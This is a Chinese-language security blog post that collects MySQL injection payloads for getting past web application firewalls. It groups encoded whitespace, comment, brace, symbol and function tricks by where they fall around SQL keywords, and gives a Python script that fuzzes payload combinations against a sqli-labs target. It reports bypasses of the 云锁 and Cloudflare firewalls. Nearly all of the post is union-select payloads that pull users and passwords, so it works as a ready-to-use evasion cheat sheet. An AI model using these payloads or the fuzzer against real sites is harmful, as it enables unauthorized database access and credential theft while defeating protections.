#### 0x01 前言

最近在网上搜集学习到关于 mysql 注入的操作，故做一个小总结。



#### 0x02 测试

[我的WafBypass之道 （SQL注入篇）](https://xz.aliyun.com/t/368)这篇文章结尾部分提到的，把每个 SQL 关键字两侧可插入的点称之为”位“，类似下图：

![](https://xzfile.aliyuncs.com/media/upload/picture/20201108164132-34146e88-219e-1.png)



我要总结的这些操作，也是围着这五个位，下面开始。

##### 位置一



(1)注释符  

`/**/  %23 --+ /*!50000union*/ `

```
id=2/**/union select 1,user,3 from admin
```


(2)空白符

`%09,%0a,%0b,%0c,%0d,%20,%a0`

```
id= 1 %0a union select 1,user,3 from admin
```


(3)科学计算法

`e .`

```
id= 2e0 union select 1,user,3 from admin

id= 1.union select 1,user,3 from admin

id= 1.1union select 1,user,3 from admin

还有%1%2E   %2%2E    %3%2E   

id= 1'  %1%2Eunion select user(),2 %23
```


(4)单引号双引号

```
id= 1'  'xx'union select user(),2 %23

id= 1'  ""union select user(),2 %23 
```
需要闭合的先闭合，然后成对使用单双引号



(5)x@ 

假设SQL语句为：select * from article where id = '2' 

`%@  *@  -@  +@  /@  <@  =@  >@ ^@ |@ %26@ -@'' -@"" -@@new `

```
id='  -@ union select 1,2 ,3 %23

id='  %26@ union select 1,2 ,3 %23

id='  -@'' union select 1,2 ,3 %23

id=' -@@new  union select 1,2 ,3 %23
```


(6){x key}

假设SQL语句为：select * from article where id = '2'

```
id=' and {x -2} union select 1,2,3 %23

id='  ||  !{`x` -2} union select 1,2,3 %23

id='  ||  !{`x` -@} union select 1,2,3 %23

id='  and {x  id} union select 1,2,3 %23

id='  and {x  id} union select 1,2,3 %23

id=' and {id (select/**/--0)}union select 1,2,3 %23
```


(7) 其他
```
\Nunion select 1,2,3 %23

null union select 1,2,3 %23
```


(8)函数

```
and  MD5('a') union select 1,password,database() from users--+

 and binary @ union select 1,password,3 from users--+

and  ST_X(Point(1, 2)) union select 1,password,database() from users--+
```
更多[内置函数](https://dev.mysql.com/doc/refman/5.6/en/sql-function-reference.html)查看



##### 位置二

(1) 空白符

`%09,%0a,%0b,%0c,%0d,%20`

```
id= 1  union%0aselect 1,user,3 from admin
```


(2)注释

` /*!*/ /**/ `

```
id= 1  union /**/select 1,user,3 from admin
```


(3)括号
```
union(select  1,(password),3,4,5,6 from(users)) %23  
```


(4) ALL | DISTINCT | DISTINCTROW

```
union ALL select  1,password,3 from users %23
```


(5)函数分隔

```
%09%0A
%0D%0b
%0b%0A
%09%0C
%09%23%0A
--%0A
%23%0A
--+\N%0A
%23%f0%0A
...
```

```
union%23%0Aselect  1,password,3 from users %23

union-- xx%0Aselect  1,password,3 from users %23
```


##### 位置三

(1) 空白符

`%09,%0a,%0b,%0c,%0d,%20`
```
union select %09 1,password,3 from users %23
```


(2)注释

` /*!*/ /**/ `

```
union select /**/ 1,password,3 from users %23
```


(3) ALL | DISTINCT | DISTINCTROW
```
union select ALL  1,password,3 from users %23
```


(4) {} ()
```
union select{x 1},password,3 from users %23

union select(1),password,3 from users %23
```


(5)符号

` + - @ ~ ! `

```
union select+1,password,3 from users %23
```

`" ' 单双引号  `

```
union select""a1,password,3 from users %23
union select+1,password,3 from users %23
```

组合

```
+@ +'' -@ -'' ~@ ~'' ~"" !@ !"" @$ @. \N$
...
```

```
union select+@a1,password,3 from users %23

union select\N$a1,password,3 from users %23
```


(6)函数

```
union select  MD5('a') |1,2,database() from users--+

union select reverse('xx'),password,3 from users %23

union select ST_X(Point(1, 2))a,2,database() from users--+
```

更多[内置函数](https://dev.mysql.com/doc/refman/5.6/en/sql-function-reference.html)查看



##### 位置四

(1) 空白符

`%09,%0a,%0b,%0c,%0d,%20,%23,%27`

```
-1' union select 1,2,user()%23from users--+
```


(2)注释

` /*!*/ /**/ `

```
-1' union select 1,2,user()/**/from users--+
```


(3) 反引号

1' union select 1,2,password \``from  users\`` --+



(4)花括号 

```
1' union select 1,2,{x password}from users --+

1' union select 1,2,(password)from users --+
```


(5) 符号

\N

1' union select 1,password,\Nfrom users --+

单双引号

 1' union select 1,user(),""from users --+  

e  .

1' union select 1,password,3e1from users --+  

1' union select 1,password,3.1from users --+  



组合

```
\N%0C  \N%23  \N%27  %7E\N  %21\N  %27\N   %2D\N  %7E\N %2D%2D%0A
%27--  --%40   --%27 --""
...
```

```
1' union select 1,user(),\NXXXX%23from users --+

1' union select 1,user(),%27XXXX--from users --+  
```


##### 位置五

(1) 空白符

`%09,%0a,%0b,%0c,%0d,%20,%2E`

```
1' union select 1,2,user() from%0dusers--+
```


(2)注释

` /*!*/ /**/ `

-1' union select 1,2,user() from /**/users--+



(3)花括号

```
1' union select 1,user(),3 from(users) --+  

1' union select 1,user(),3 from{x users} --+  
```


#### 0x03 FUZZ

很多时候，单一姿势是无法奏效绕过的，有些姿势也是需要大量 FUZZ 得到，使用大量字符编码对 SQL 语句的“位”进行 FUZZ，编写了一个简单Python脚本演示。

##### Python脚本

![](https://xzfile.aliyuncs.com/media/upload/picture/20201108164903-40f32b2a-219f-1.png)


```python
import requests
import itertools


List = ['%20','%09','%0a','%0b','%0c','%0d','%2d%2d','%23','%a0','%2D%2D%2B','%5C%4E','\\N']

count = 0
num = 2 #fuzz num 个字符组合
target = 'http://localhost/sqli-labs-master/Less-1/?id=-1\' '

for i in itertools.product(List,repeat=num):

    count += 1
    print(count,':',len(List)**num)

    str = ''.join((i))
    payload = '{}union select 1,user(),3 from users %23'.format(str)
    url = target + payload
    req = requests.get(url=url)

    if "root@localhost" in req.text:
        print(url)
        with open("result.txt",'a',encoding='utf-8') as r:
            r.write(str + "\n")

```



##### 云锁

fuzz 位置一利用空白字符、注释、浮点数等生成2个字符组成的有效 payload

![](https://xzfile.aliyuncs.com/media/upload/picture/20201108164933-52acf990-219f-1.png)



Burp跑下，得到状态为 200 就是绕过的字符串，这里建议请求访问频率设置慢点，太快会被ban ip。

![](https://xzfile.aliyuncs.com/media/upload/picture/20201108164954-5f65c036-219f-1.png)



绕过

![](https://xzfile.aliyuncs.com/media/upload/picture/20201108165012-69aed60e-219f-1.png)



##### cloudflare



![](https://xzfile.aliyuncs.com/media/upload/picture/20201108165028-7376fb08-219f-1.png)





#### 0x04 参考

https://mp.weixin.qq.com/s/qG_m7YXvEw2PwFXQDj6_qw

https://www.ms509.com/2020/06/24/Waf-Bypass-Sql/

https://xz.aliyun.com/t/368


